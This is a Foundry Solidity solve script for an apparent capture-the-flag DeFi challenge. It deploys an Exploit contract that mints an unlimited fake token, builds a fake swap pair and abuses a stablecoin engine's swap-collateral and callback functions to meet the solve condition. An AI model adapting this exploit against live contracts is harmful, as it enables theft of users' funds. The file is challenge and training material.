pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {USDS,USDC,WETH,SafeMoon,Setup,USDSEngine} from "src/core/Setup.sol";

import {IBi0sSwapFactory} from "src/bi0s-swap-v1/interfaces/IBi0sSwapFactory.sol";
import {IBi0sSwapPair} from "src/bi0s-swap-v1/interfaces/IBi0sSwapPair.sol";
import "forge-std/StdJson.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IBi0sSwapCalle} from "src/bi0s-swap-v1/interfaces/IBi0sSwapCalle.sol";

contract Solve is Script{
    using stdJson for *;

    function run()public{
        string memory path = string.concat("broadcast/Deploy.s.sol/", vm.toString(block.chainid), "/run-latest.json");
        string memory json = vm.readFile(path);
        address setupAddress = json.readAddress(".transactions[0].contractAddress");
        vm.startBroadcast();
        Exploit exploit=new Exploit(setupAddress);
        exploit.pwn{value:1100}();
        vm.stopBroadcast();
    }
}


contract Exploit is ERC20{
    Setup setup;
    IBi0sSwapFactory factory;
    WETH weth;
    USDSEngine usdsEngine;
    constructor(address _setup) ERC20("FAKE","FAKE"){
        _mint(address(this),type(uint256).max);
        setup=Setup(_setup);
        factory=setup.bi0sSwapFactory();
        usdsEngine=setup.usdsEngine();
        weth=setup.weth();

    }
    function pwn()public payable{
        bytes32 FLAG_HASH=keccak256("YOU NEED SOME BUCKS TO GET FLAG");
        address _fakePair=factory.createPair(address(weth), address(this));
        IBi0sSwapPair fakePair=IBi0sSwapPair(_fakePair);
        weth.deposit{value:1001}(address(this));
        weth.transfer(_fakePair,1000);
        _transfer(address(this), _fakePair, uint256(uint160(address(this)))*1e10);
        fakePair.addLiquidity(address(this));
        weth.approve(address(usdsEngine), 1);
        uint256 swapOutAmount=getSwapOutAmount(1,fakePair);
        usdsEngine.depositCollateralThroughSwap(address(weth), address(this),1 , swapOutAmount-uint256(uint160(address(this))));
        uint256 InitialAmount=uint256(FLAG_HASH)+1+uint256(uint160(address(this)));
        bytes memory data=abi.encode(uint256(FLAG_HASH)+1);
        usdsEngine.bi0sSwapv1Call(address(this), address(weth),InitialAmount, data);
        usdsEngine.bi0sSwapv1Call(address(this), address(setup.safeMoon()), uint256(FLAG_HASH)+1, data);
        setup.setPlayer(address(this));
        console.log(setup.isSolved());
    }


    function getSwapOutAmount(uint256 inputAmount,IBi0sSwapPair swapPair)public view returns (uint256 outputAmount){
        uint256 reserveIn;
        uint256 reserveOut;

        if(swapPair.token0()==address(this)){
            reserveIn=swapPair.reserve1();
            reserveOut=swapPair.reserve0();
        }else{
            reserveIn=swapPair.reserve0();
            reserveOut=swapPair.reserve1();
        }

        uint256 newReserveOut = (reserveIn*reserveOut)/(reserveIn + inputAmount);
        outputAmount = reserveOut - newReserveOut;
    }
}
